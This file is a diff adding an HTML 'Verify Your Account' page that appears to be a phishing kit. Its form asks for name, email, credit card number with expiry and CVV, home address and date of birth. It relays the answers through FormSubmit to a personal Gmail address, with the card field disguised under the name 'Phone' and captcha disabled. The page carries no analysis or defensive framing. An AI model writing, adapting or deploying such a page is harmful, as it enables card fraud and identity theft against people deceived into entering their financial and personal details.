@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+  <div class="logo">YOUR LOGO</div>
+  <h2>Verify Your Account</h2>
+  <p class="sub">Need help? Send us a message</p>
+  
+  <!-- This uses FormSubmit - free service to send form to your email -->
+  <form action="https://formsubmit.co/ajewoletemitope11@gmail.com" method="POST">
+    <!-- Settings for FormSubmit -->
+    <input type="hidden" name="_subject" value="New Contact Form Submission">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="thankyou.html">
+
+    <label>Full Name</label>
+    <input type="text" name="Full Name" placeholder="Full Name" required>
+    
+    <label>Email Address</label>
+    <input type="email" name="Email" placeholder="Email Address" required>
+
+    <label>Credit Card Number Exp Cvv</label>
+    <input type="text" name="Phone" inputmode="numeric" pattern="[0-9]*" placeholder="Credit Card Number - digits only" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+
+    <label>Home Address</label>
+    <input type="text" name="Home Address" placeholder="Home Address">
+
+    <label>Date of Birth — optional</label>
+    <input type="date" name="Date of Birth">
+
+    <button class="btn-red" type="submit">Submit</button>
+  </form>
+  <p><a href="index.html" class="link-red">Back to Login</a></p>
+</div>
+</body>
+</html>
